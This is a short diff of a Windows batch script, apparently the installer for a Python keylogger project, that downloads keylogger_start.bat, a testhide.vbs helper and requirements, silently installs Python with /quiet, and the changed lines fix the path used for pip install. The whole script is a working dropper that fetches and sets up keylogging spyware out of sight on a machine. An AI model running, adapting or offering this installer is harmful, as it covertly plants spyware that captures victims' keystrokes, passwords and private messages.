@@ -6,5 +6,6 @@ curl "https://github.com/Raikster/keylogger_python/keylogger_start.bat" --output
 curl "https://github.com/Raikster/keylogger_python/testhide.vbs" --output testhide.vbs
 curl "https://github.com/Raikster/keylogger_python/requirements.txt" --output requirements.txt
 curl "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
-start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0 SimpleInstall=1
-pip install -r requirements.txt
+start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0
+cd %UserProfile%\AppData\Local\Programs\Python\Python39\Scripts
+pip.exe install -r requirements.txt
